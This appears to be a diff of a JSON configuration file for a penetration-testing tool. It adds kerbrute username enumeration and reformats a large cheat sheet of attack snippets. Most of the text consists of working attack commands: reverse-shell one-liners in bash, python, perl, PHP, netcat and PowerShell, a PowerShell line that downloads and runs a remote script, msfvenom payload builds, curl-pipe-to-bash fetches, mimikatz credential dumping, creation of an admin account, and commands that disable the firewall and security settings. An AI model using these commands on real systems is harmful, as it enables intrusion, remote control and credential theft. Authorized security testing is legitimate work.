@@ -71,7 +71,7 @@
             "comment": "",
             "detached": false,
             "binary": "/bin/bash",
-            "args": ["scripts/smb.sh","%%%IP%%%", "%%%USERNAME%%%", "%%%PASSWORD%%%"]
+            "args": ["scripts/smb.sh", "%%%IP%%%", "%%%DOMAIN%%%", "%%%USERNAME%%%", "%%%PASSWORD%%%"]
         },
         "redis_script": {
             "name": "Redis enum",
@@ -185,6 +185,14 @@
             "in_terminal": false,
             "binary": "/usr/bin/onesixtyone",
             "args": ["-c", "/usr/share/wordlists/SecLists/Discovery/SNMP/snmp-onesixtyone.txt", "%%%IP%%%"]
+        },
+        "kerbrute": {
+            "name": "kerbrute",
+            "text": "Guess usernames with kerbrute",
+            "detached": false,
+            "in_terminal": false,
+            "binary": "/usr/bin/kerbrute",
+            "args": ["userenum", "--dc", "%%%IP%%%", "-d", "%%%DOMAIN%%%", "/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-custom.txt"]
         }
     },
     "ports_associations": {
@@ -208,6 +216,9 @@
             "80": [
                 "nikto",
                 "sqlmap"
+            ],
+            "88": [
+                "kerbrute"
             ],
             "135": [
                 "smb_script",
@@ -253,9 +264,6 @@
     },
     "autorun": {
         "tcp": {
-            "any": [
-                "nuclei"
-            ],
             "21": [
                 "nmap_ftp"
             ],
@@ -265,6 +273,9 @@
             "80": [
                 "feroxbuster",
                 "nikto"
+            ],
+            "88": [
+                "kerbrute"
             ],
             "443": [
                 "feroxbuster"
@@ -302,8 +313,7 @@
         "autosave": false,
         "autosave_interval" : 600000,
         "preferred_interfaces": ["tun0", "vpn0", "eth0"],
-        "preferred_lport" : 8444,
-        "preferred_sharename": "myshare"
+        "preferred_lport" : 8444
     },
     "user_variables": {
         "USERNAME": "",
@@ -311,54 +321,62 @@
         "DOMAIN": ""
     },
     "snippets": {
-        "Reverse shells": {
-            "Launching the reverse shell": [
+        "Reverse shells":
+        [
+            "Launching the reverse shell",
+            [
                 "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
             ],
-            "Bash TCP": [
+            "Bash TCP",
+            [
                 "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1",
                 "0<&196;exec 196<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%; sh <&196 >&196 2>&196",
                 "/bin/bash -l > /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0<&1 2>&1"
             ],
-            "Bash UDP": [
+            "Bash UDP",
+            [
                 "sh -i >& /dev/udp/%%%LHOST%%%/%%%LPORT%%% 0>&1"
             ],
-            "socat": [
+            "socat",
+            [
                 "user@attack$ socat file:`tty`,raw,echo=0 TCP-L:%%%LPORT%%%",
                 "user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%%%LHOST%%%:%%%LPORT%%%"
             ],
-            "perl": [
+            "perl",
+            [
                 "perl -e 'use Socket;$i=\"%%%LHOST%%%\";$p=%%%LPORT%%%;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                 "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%%%LHOST%%%:%%%LPORT%%%\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
             ],
-            "python": [
+            "python",
+            [
+                "IPv4",
                 [
-                    "IPv4",
                     "export RHOST=\"%%%LHOST%%%\";export RPORT=%%%LPORT%%%;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
-                    "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
-                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-                    "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+                    "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
                 ],
+                "IPv4 (No Spaces)",
                 [
-                    "IPv4 (No Spaces)",
-                    "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
-                    "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-                    "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+                    "python3 -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+                    "python3 -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "python3 -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
                 ],
+                "IPv4 (No Spaces, Shortened)",
                 [
-                    "IPv4 (No Spaces, Shortened)",
-                    "python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
-                    "python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
-                    "python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"
+                    "python3 -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
+                    "python3 -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
+                    "python3 -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"
                 ],
+                "IPv4 (No Spaces, Shortened Further)",
                 [
-                    "IPv4 (No Spaces, Shortened Further)",
-                    "python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
-                    "python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
-                    "python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"
+                    "python3 -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
+                    "python3 -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
+                    "python3 -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"
                 ]
             ],
-            "PHP": [
+            "PHP",
+            [
                 "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                 "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                 "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);`/bin/sh -i <&3 >&3 2>&3`;'",
@@ -367,57 +385,70 @@
                 "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
                 "php -r '$sock=fsockopen(\"%%%LHOST%%%\",%%%LPORT%%%);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
             ],
-            "Ruby": [
+            "Ruby",
+            [
                 "ruby -rsocket -e'f=TCPSocket.open(\"%%%LHOST%%%\",%%%LPORT%%%).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                 "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%%%LHOST%%%\",\"%%%LPORT%%%\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
             ],
-            "Golang": [
+            "Golang",
+            [
                 "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%%%LHOST%%%:%%%LPORT%%%\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
             ],
-            "Netcat Traditional": [
+            "Netcat Traditional",
+            [
                 "nc -e /bin/sh %%%LHOST%%% %%%LPORT%%%",
                 "nc -e /bin/bash %%%LHOST%%% %%%LPORT%%%",
                 "nc -c bash %%%LHOST%%% %%%LPORT%%%"
             ],
-            "Netcat OpenBsd": [
+            "Netcat OpenBsd",
+            [
                 "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %%%LHOST%%% %%%LPORT%%% >/tmp/f"
             ],
-            "Netcat BusyBox": [
+            "Netcat BusyBox",
+            [
                 "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %%%LHOST%%% %%%LPORT%%% >/tmp/f"
             ],
-            "Ncat": [
+            "Ncat",
+            [
                 "ncat %%%LHOST%%% %%%LPORT%%% -e /bin/bash",
                 "ncat --udp %%%LHOST%%% %%%LPORT%%% -e /bin/bash"
             ],
-            "Powershell": [
+            "Powershell",
+            [
                 "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%%%LHOST%%%\",%%%LPORT%%%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                 "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%%%LHOST%%%',%%%LPORT%%%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
                 "powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"
             ],
-            "Awk": [
+            "Awk",
+            [
                 "awk 'BEGIN {s = \"/inet/tcp/0/%%%LHOST%%%/%%%LPORT%%%\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
             ],
-            "Java": [
+            "Java",
+            [
                 "Runtime r = Runtime.getRuntime();",
                 "Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%;cat <&5 | while read line; do $line 2>&5 >&5; done'\");",
                 "p.waitFor();"
             ],
-            "Java alternative": [
+            "Java alternative",
+            [
                 "String host=\"%%%LHOST%%%\";",
                 "int port=%%%LPORT%%%;",
                 "String cmd=\"cmd.exe\";",
                 "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
             ],
-            "Telnet": [
+            "Telnet",
+            [
                 "attacker$ nc -lvp %%%LPORT%%%",
                 "attacker$ nc -lvp 8081",
                 "victim$ telnet %%%LHOST%%% %%%LPORT%%% | /bin/sh | telnet %%%LHOST%%% 8081"
             ],
-            "War": [
+            "War",
+            [
                 "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f war > reverse.war",
                 "strings reverse.war | grep jsp # in order to get the name of the file"
             ],
-            "Msfvenom": [
+            "Msfvenom",
+            [
                 "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f exe > reverse.exe",
                 "msfvenom -p windows/shell_reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f exe > reverse.exe",
                 "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%%%LHOST%%% LPORT=%%%LPORT%%% -f elf >reverse.elf",
@@ -434,50 +465,61 @@
                 "msfvenom -p php/meterpreter_reverse_tcp LHOST=\"%%%LHOST%%%\" LPORT=%%%LPORT%%% -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php",
                 "msfvenom -p windows/adduser USER=hacker PASS=Password01 -f exe > adduser.exe"
             ],
-            "Credits": [
+            "Credits",
+            [
                 "PayloadsAllTheThings, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
             ]
-        },
-        "Linux": {
-            "Get file from HTTP server": [
+        ],
+        "Linux":
+        [
+            "Get file from HTTP server",
+            [
                 "sudo python -m http.server 80 --directory /usr/share/linux-binaries/PEASS-ng/linPEAS/",
                 "cd /tmp/; wget http://%%%LHOST%%%/linpeas.sh -O /tmp/l.sh; bash /tmp/l.sh",
                 "curl http://%%%LHOST%%%/linpeas.sh | bash"
             ],
-            "Upgrade shell with a tty": [
+            "Upgrade shell with a tty",
+            [
                 "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
             ],
-            "Reverse SSH (https://github.com/Fahrj/reverse-ssh)": [
+            "Reverse SSH (https://github.com/Fahrj/reverse-ssh)",
+            [
+                "Bind SSH",
                 [
-                    "Bind SSH",
                     "victim$ ./reverse-ssh",
                     "attacker$ ssh -p 31337 <RHOST> #(default password: letmeinbrudipls)"
                 ],
+                "Reverse SSH",
                 [
-                    "Reverse SSH",
                     "attacker$ ./reverse-ssh -v -l -p %%%LPORT%%% # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)",
                     "victim$ ./reverse-ssh -p %%%LPORT%%% %%%LHOST%%%",
                     "attacker$ ssh -p 8888 127.0.0.1"
                 ]
             ]
-        },
-        "Windows": {
-            "Copy files from SMB": [
-                "sudo smbserver.py -smb2support %%%SHARENAME%%% /usr/share/windows-binaries/priv-esc",
-                "copy \\\\%%%LHOST%%%\\%%%SHARENAME%%%\\seatbelt.exe seatbelt.exe"
+        ],
+        "Windows":
+        [
+            "Copy files from SMB",
+            [
+                "sudo smbserver.py -smb2support share /usr/share/windows-binaries/priv-esc",
+                "copy \\\\%%%LHOST%%%\\share\\seatbelt.exe seatbelt.exe"
             ],
-            "Copy files from HTTP": [
-                "sudo python -m http.server 80 --directory /usr/share/windows-binaries/priv-esc",
+            "Copy files from HTTP",
+            [
+                "sudo python -m http.server 80",
                 "powershell -c wget http://%%%LHOST%%%/seatbelt.exe -OutFile seatbelt.exe"
             ],
-            "Privesc stuff": [
+            "Privesc stuff",
+            [
                 ".\\seatbelt.exe -full -group=all"
             ],
-            "Add user into administrators group": [
+            "Add user into administrators group",
+            [
                 "net user hacker Password01 /add",
                 "net localgroup administrators hacker /add"
             ],
-            "Mimikatz": [
+            "Mimikatz",
+            [
                 "log",
                 "privilege::debug",
                 "sekurlsa::logonpasswords",
@@ -487,7 +529,8 @@
                 "lsadump::secrets",
                 "lsadump::sam"
             ],
-            "Enable Remote Desktop Service": [
+            "Enable Remote Desktop Service",
+            [
                 "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
                 "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
                 "",
@@ -495,11 +538,12 @@
                 "",
                 "poetry run cme smb <ip> -u <user> -p <pass> --local-auth -M rdp -o ACTION=enable"
             ],
-            "Lower local security": [
+            "Lower local security",
+            [
                 "netsh advfirewall set allprofiles state off",
                 "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
                 "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
             ]
-        }
+        ]
     }
 }
